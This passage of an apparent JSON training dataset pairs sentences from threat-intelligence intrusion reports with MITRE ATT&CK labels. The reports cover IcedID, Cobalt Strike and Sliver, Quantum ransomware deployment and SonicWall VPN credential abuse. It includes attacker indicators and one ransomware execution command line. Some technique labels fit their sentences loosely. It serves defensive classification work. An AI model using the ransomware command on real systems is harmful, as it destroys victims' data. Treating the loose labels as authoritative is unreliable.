    "text": "In one instance, the threat actor used certutil to download PowerView to run various discovery commands.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor needed to output the commands to a public location served on an Exchange server to retrieve the results.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "In another compromised host, we saw other common commands we observe to gain situational awareness in the environment.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Meterpreter history included the following PowerShell reverse shell:",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Analyzing the local Sliver DB (.sliver/sliver.db), we can extract the C2 endpoint and active implants.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "We can query the beacons table to get a list of the compromised hosts and the associated command and control server endpoint:",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "In the database we observed 66 beacons connecting to the server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "From these connected beacons, we derived the following dwell time statistics.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Beacons with a minimum time of zero seconds indicate the the beacon failed, perhaps because the attack was unsuccessful.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "For other beacons we observed indications that the threat actor was testing the beacon.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "When reviewing the 66 beacons only 16 of them had an active time of more than five minutes.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "We first picked up the server as hosting a Sliver team server on 2022-11-16.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "We continued to observe it until 2023-02-13.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "After that we picked it up again for Sliver activity on 2023-10-09.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The server remains active in our dataset through the date of publication.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "While we didn’t observe the threat actor actively use Cobalt Strike, a copy of v4.7 was found in the opendir.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The server logs recorded one login on 10 Apr 2023 from 45.56.162.100 :",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The Sliver database ./.sliver/sliver.db included the names and tokens of the operators on the Sliver server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The default SSH username for vpnjantit[.]com is the service login with the “-vpnjantit[.]com” added to the end according to the site’s documentation.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "This indicates the username used for the vpnjantit[.]com service was ‘pareshraval’.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "This intrusion began by the execution of IcedID malware contained within an ISO image.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Delivering payloads using an ISO image is a common technique observed in several prior cases.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "This technique has grown in use as threat actors look to evade Mark-of-the-Web controls.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The ISO image delivered a hidden directory containing a IcedID payload and a batch file.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "After being successfully mounted (double clicked), the end user only sees a malicious LNK file named documents nside the virtual hard drive.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Clicking on the LNK file executes the batch file, which copies the IcedID payload to the user’s AppData\\Local\\Temp folder and loads it using rundll32.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "A scheduled task was created at that time to maintain persistence on this host as well.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Upon the execution of the IcedID payload, discovery commands using Windows utilities such as net, nltest, and ipconfig were executed to discover domain trusts, domain admins, workstation configuration, etc.",
    "command": "",
    "labels": [
      "T1016",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Around 16 hours after the initial execution, the first Cobalt Strike beacon DLL was executed from the IcedID malware.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This led to another round of discovery using net followed by AdFind.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor installed Atera and Splashtop remote access software via an MSI file.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "This was followed by a batch script used to perform DNS lookups on hosts across the environment.",
    "command": "",
    "labels": [
      "T1016",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "After this, the threat actors began their first lateral movement to a server in the environment by copying their Cobalt Strike DLL over to the host and executing it via a remote service.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "They then repeated the install of the remote access software package.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Some two hours later, another Cobalt Strike beacon was executed.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "With this beacon, the threat actors succeeded in elevating to SYSTEM on the beachhead host and proceeded to dump LSASS memory.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Another round of activity took place using system tools, batch files, and Adget.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Several more beacons were also loaded on the host using DLLs and PowerShell.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "At this point, the threat actors had the clear text credentials for one of the domain administrator accounts and began moving laterally to other systems.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "They issued remote commands using WMIC to conduct discovery, as well as distribute and execute Cobalt Strike beacons.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "These actions, however, failed to get a beacon to launch on the domain controller being targeted.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "After an hour or so of failures, the threat actors proceeded to RDP into the domain controller.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Once there, they then loaded textbin[.]net, a pastebin style site, to download Cobalt Strike PowerShell code to the host in a file named pon.txt.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Trying to execute this locally failed as well, and the threat actor moved on to downloading a variety of beacon executables (e.g.lsass.exe, lsasss.exe, etc.).",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "These beacons, however, continued to crash and fail to run.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Around an hour after starting the RDP session, the threat actors executed a PowerShell command to disable Windows Defender Antivirus on the host and reviewed Group Policy Objects for the domain.",
    "command": "",
    "labels": [
      "T1016",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The Cobalt Strike beacons then began to execute successfully on the domain controller.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Now, with Cobalt Strike beacons on the domain controller, the threat actors continued with discovery actions using Invoke-ShareFinder and other PowerShell and system utilities.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "A few hours after, the threat actors installed the RSAT tools onto the beachhead host.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "However, they appear to have been unfamiliar with the tools and called up the help menu before using Get-ADComputer to collect the details on hosts in the environment.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Back on the domain controller, ProcDump was used to dump LSASS memory.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The PowerShell command Get-EventLog was then used to collect logon events on all domain administrators in the network.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "When they returned, several more Cobalt Strike beacons were launched and several different Mimikatz implementations were executed on the domain controller, including a Mimikatz executable and a PowerShell implementation.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "For the next several hours, repeats of previous discovery actions and additional beacons executed using remote WMIC commands, were observed.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "A new batch file, localdisk.bat, was also executed using remote WMI commands, to collect disk data on hosts around the environment.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "These discovery actions were completed several times again in other various batch files.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "On the start of the fourth day, the threat actors continued to repeat their previous discovery and beacon spreading activity.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Near the end of the day, the threat actors moved to install AnyDesk on several servers including a backup management host, likely as a further means of persistence or later command and control.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Next, the threat actor executed PowerShell to pop up an alert message on several hosts, letting the user know that the machine was infected with Cobalt Strike.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "After completing this activity, they used Rclone to exfiltrate copies of the backup files to the Mega.io cloud storage service.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors then staged a ransomware binary on the backup server but did not immediately execute it.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Once executed, the ransomware left the ransom note README_TO_DECRYPT.html, which informs the victim that Quantum ransomware is responsible for the intrusion.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "This intrusion began by the execution of a malicious LNK embedded in an ISO file (masquerading as a folder).",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "First, the user clicked on the ISO file, which created a new virtual hard drive disk.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "This ISO file contains a LNK named documents and a hidden directory named max containing a cobalt strike DLL beacon and a batch file.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1071.001",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "As we can see below using LECmd by Eric Zimmerman, the file documents.lnk points to max\\eyewear.bat.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "On the second day of the intrusion, the threat actors used the IcedID malware to drop a Cobalt Strike beacon and execut it using regsvr32.exe.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "After beginning to move laterally, the threat actors used many other execution techniques such as PowerShell and executables run from their interactive RDP session in addition to DLLs.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "A number of application crashes were observed across several compromised hosts.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "This activity was a result of the threat actors attempting to execute various dropped tools or beacons on the endpoint, triggering a Windows Error Reporting (WER) fault process.",
    "command": "",
    "labels": [
      "T1105",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Some of these crashes may have been in response to being detected by Microsoft Defender.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "TrojanDropper:PowerShell/Cobacis.B",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "VirTool:MSIL/Menace.C!MTB",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "There was evidence that that the Cobalt Strike aggressor script AnnoyKit was leveraged to launch Internet Explorer via a COM object.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "IcedID created a DLL named Utucka.dll just after the initial execution.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "A scheduled task was then created using this same DLL.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "First execution was observed on Day 1 at 8:00 PM and was repeated every hour.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The named pipe impersonation technique was used multiple times on different hosts in order to get system privileges.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This is a common technique used by threat actors, and implemented by the GetSystemCobalt Strike command.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The beacon creates the named pipe (seen in Sysmon EventID 17) and impersonates the NT AUTHORITY\\SYSTEM account used to connect to the pipe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The MITRE Cyber Analytics Repository (CAR) details the Get System elevation, CAR-2021-02-002: Get System Elevation",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Multiple access to WinLogon with granted access 0x40 (PROCESS_DUP_HANDLE) were performed.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "As explained in this blog written by Jonathan JOHNSON, opening a handle to WinLogon in order to duplicate the token and call ImpersonateLoggedOnUser is a known Cobalt Strike technique.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "On the second day of the intrusion, a spike in NetLogon traffic was observed from the beachhead host to a domain controller.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "This traffic then triggered several network signatures for CVE-2020-1472 otherwise known as ZeroLogon.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The event logs corroborated a successful exploitation with a password update Event 4742 for one of the Domain Controller passwords.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors delivered the initial malware as a zip file, with the contents of a ISO file, which contained their payload to gain access to the target environment.",
    "command": "",
    "labels": [
      "T1105",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "These packages are designed to evade controls such as Mark-of-the-Web restrictions.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "This command was downloaded from a remote site to a file named pon!.txt and then executed locally.",
    "command": "",
    "labels": [
      "T1105",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Multiple suspicious calls to the function CreateRemoteThread (Sysmon Event ID 8) were observed.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This is a known behavior of Cobalt Strike and its function shinject, which can be used to inject a new beacon or a specific program to another process on the victim’s computer.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "As a result, we observed abnormal winlogon.exe process behavior; winlogon.exe performed DNS requests (Sysmon event ID 22) to a Cobalt Strike C2 domain guteyutu[.]com.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The injection is also visible from memory dumps.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Several hosts showed rundll32 processes exhibiting common process injection behavior, where the MZ file header is seen in the starting memory address in rundll32 processes with PAGE_EXECUTE_READWRITE permissions.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Many of these beacons could also be detected in memory scanning with the Malpedia Cobalt Strike rule.",
    "command": "",
    "labels": [
      "T1055",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Multiple injections into the LSASS process were observed on multiple hosts.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Threat actors used the function CreateRemoteThread in order to inject malicious code in LSASS process to access credentials.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This process was invoked by RunDLL32.exe which was an injected Cobalt Strike beacon reaching out to the command and control server at 111.90.143[.]191.",
    "command": "",
    "labels": [
      "T1055",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "A number of familiar discovery techniques were utilized using various OS commands to discover information relating to the user, host, and network configuration.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Standard time discovery, domain trust discovery, workstation configuration discovery, and use of the net command to discover standard accounts and groups were observed.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Two file sharing web sites were used to access files, these were dropmefiles[.]com and file[.]io.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Both of these services were accessed on day two from one Domain Controller on the network, with file downloads relating to tooling/scripts.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "On day three, a second Domain Controller was observed accessing the dropmefiles[.]com domain.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Reviewing the WebCacheV01.dat on the domain controllers, reveals more details on the sites loaded, including the files that where downloaded from those sites:",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors downloaded the lsass.exe beacon from their attacker hosted infrastructure at 199.127.60[.]117.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "In addition, the threat actors also used Internet Explorer on the domain controller to search Bing.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The current search results point to how to change the hidden view attribute in file explorer in reference to the ProgramData folder.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Share discovery with Invoke-ShareFinder",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Other tools observed in use, included Invoke-ShareFinder, this is a common tool that we frequently encountered in cases for enumerating network shares and identifying data and potential targets.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "In this case, there is a clear indication that the operator launched the Invoke-ShareFinder command via Cobalt Strike, as observed in Event ID 800:",
    "command": "",
    "labels": [
      "T1071.001",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Executing this query would return all events in the Security log that references the specified account and with a source network address.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Events returned would include process creation, logins, etc.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Its likely that this discovery technique forms an extension of T1033 – System Owner/User Discovery, where the threat actor was leveraging this data source to understand the account pattern of life, any indicators from compromise, and to potentially blend in adversary activities.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Other discovery activities observed included a domain host discovery script via PowerShell.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "More tools dropped by threat actors",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Other binaries and scripts were dropped onto one endpoint:",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The ns.bat file contained thousands of nslookup commands with a corresponding hostname from the network, with output appended to a ns.txt file.",
    "command": "",
    "labels": [
      "T1016",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "An Active Directory collection tool named ADGet was dropped into a user’s temp folder and executed with an output filename argument.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Its a simple to use tool, the application is invoked from the command line and passes an output file name to save enumerated AD objects.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "ADGet is an uncommon tool, however, its function is very similar to ADfind–the key difference is that LDAP queries are not passed, they are instead coded into the binary itself.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The AD objects will be enumerated generating a zip output file containing the following TSV (tab separated files) files if using a default configuration:",
    "command": "",
    "labels": [
      "T1071.001",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "While Adget was seen used, prior to that tool being run the threat actors also deployed the tried and true AdFind, which was renamed to find.exe and called using find.bat.",
    "command": "",
    "labels": [
      "T1083",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Another batch file named AD.bat was dropped into the ProgramData folder on one host and used adfind to enumerate AD objects.",
    "command": "",
    "labels": [
      "T1083",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Interestingly, the first line in the batch file denotes the WMI output configuration in HTML form (from XSL file c:\\windows\\system32\\wbem\\en-US\\htable.xsl).",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Its likely the code was reused from other open source pentest enumerations scripts available, such as:",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The use of WMIC was leveraged by a batch file named dS.bat that queried a number of target hosts to determine the host disk drive configuration.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "This can be useful to determine drives, including mounted network shares.",
    "command": "",
    "labels": [
      "T1047",
      "T1082",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Threat actors used wmic.exe in order to execute PowerShell Cobalt Strike beacons on multiple workstations and servers.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "The payloads were stored on textbin[.]net.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "As we can see above, WmiPrvSe.exe (WMI Provider Host) executed the PowerShell Cobalt Strike beacon on the remote computers.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "The beacon C:\\ProgramData\\lsass.exe was used to proxy RDP connections and connect to another computer.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "During these RDP sessions, the threat actors often opened Internet Explorer to download their beacons or commands they wanted to run on lateral hosts.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Remote services were also created in order to propagate Cobalt Strike beacons in the network.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "In addition, multiple text files were also created to store the output of various discovery commands and scripts.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Initially the IcedID malware made a connection to 64.227.12[.]180:80 for it’s first call back.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "After the first call over an unencrypted port, command and control traffic moved over to TLS on port 443.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Connections were made to various IP’s over the length of the intrusion, but two made up the majority of the traffic.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "There were a number of beacons deployed across the environment, over 70 pipes were created.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "For example, on one host, we could observe over 20 pipes being created, in a pattern of postex_xxxx or MSSE-xxxx-server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "When beacons were deployed within the environment, there was a significant increase in outbound network connections to C2 servers.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "For example, a beacon injected into a single Rundll32.exe process generated over 10K connections in a three hour window, consistently across two days.",
    "command": "",
    "labels": [
      "T1055",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors deployed various beacons over the course of the intrusion using different methods including executables, DLLs, and PowerShell beacons.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Over the length of the intrusion four different Cobalt Strike servers were observed in use.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "It is unclear why the threat actor used three different tools in order to establish an interactive and persistent command and control channel.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "While the threat actors made attempts to proxy RDP traffic and minimize external RDP access, the threat actors’ workstation was revealed in several Windows logs.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Sysmon Event ID 24 linked the threat actors host name HYPERV and the IPv4 address of 199.101.184[.]230.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "For example, Event 4779 relating to a user disconnecting from a terminal session, reveals the client name of the source workstation.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The client address was the internal workstation where the RDP traffic was being proxied through.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "During the second day of the intrusion, documents from the organization were opened remotely from 212.102.59[.]162 and 165.231.182[.]14.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Interestingly, the operator issued a command that displayed an alert informing the end user of a compromise, specifically with Cobalt Strike.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "They created a file (2.txt) and populated it with a list of hosts they had uncovered during their discovery activity.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor then tried again on a different server using a DLL this time: rundll32 locker_32.dll,run /target=@2.txt",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "They then opened an RDP connection back to the primary domain controller and proceeded to try to execute the binary with a target list again.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "After only affecting the single host, the threat actors dropped several batch scripts on the server: pass.bat, 1.bat, 2.bat",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The 1.bat file then proceeded to copy the ransomware binary across to hosts in the environment.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "When the payload was executed, there were some telltale registry events observed indicating .Quantum file extension Shell Open Command artifacts.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Initial access was gained using compromised SonicWall VPN credentials, while other offensive tools facilitated credential theft, exploitation of Active Directory vulnerabilities, and lateral movement.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Persistence was maintained through AnyDesk, automated by a PowerShell script that preconfigured remote access credentials.",
    "command": "",
    "labels": [
      "T1078",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Among the tools were SonicWall Scanner for exploiting VPN credentials, DonPAPI for extracting Windows DPAPI-protected credentials, Certipy for abusing Active Directory Certificate Services (AD CS), Zer0dump, and Pachine/noPac for exploiting Active Directory vulnerabilities like CVE-2020-1472.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The affiliate also leveraged AnyDesk for persistence through an automated PowerShell script and hosted Sliver C2 components on the server for managing implants.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "In the comment sections of VirusTotal, a user mentioned that the server was used as a command-and-control server, potentially also for data exfiltration.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Sliver: The threat actor leveraged the server to host Sliver C2, as listed in ThreatFox and based on the files residing in the open-directory.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The DFIR Threat Intelligence Group observed this server hosting the Sliver team server port 31337 on 2024-12-11, but it was not seen again after that first sighting.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "In a very close timeframe, another Sliver C2 was deployed in the same ASN, AS62240, which is owned by Clouvider, a hosting provider.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "SonicWall Scanner: The server contained a ZIP file called sonic_scan.zip, in which a Python script and a file, data.txt, with potentially compromised VPN credentials were present, that had the following structure: Target IP Address, Username, Password, Domain Name, VPN Software.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The script sonic_scan/main.py allows the threat actor to authenticate to SonicWall VPN appliances and execute a port scan by performing the following actions:",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Reads and parses data.txt to get the IP address, username, password and domain name (if any) of the target appliance.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "For every entry in data.txt, which represents a potential valid account, obtains the domain name associated with the specific IP address and then executes the NetExtender process to login into the target VPN.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "After the execution of NetExtender, the script parses the output produced by the VPN and, if the connection was successful, a loop is initiated until the string “NetExtender connected successfully” is found.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Once the Nmap scan is completed, the NetExtender process is terminated.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
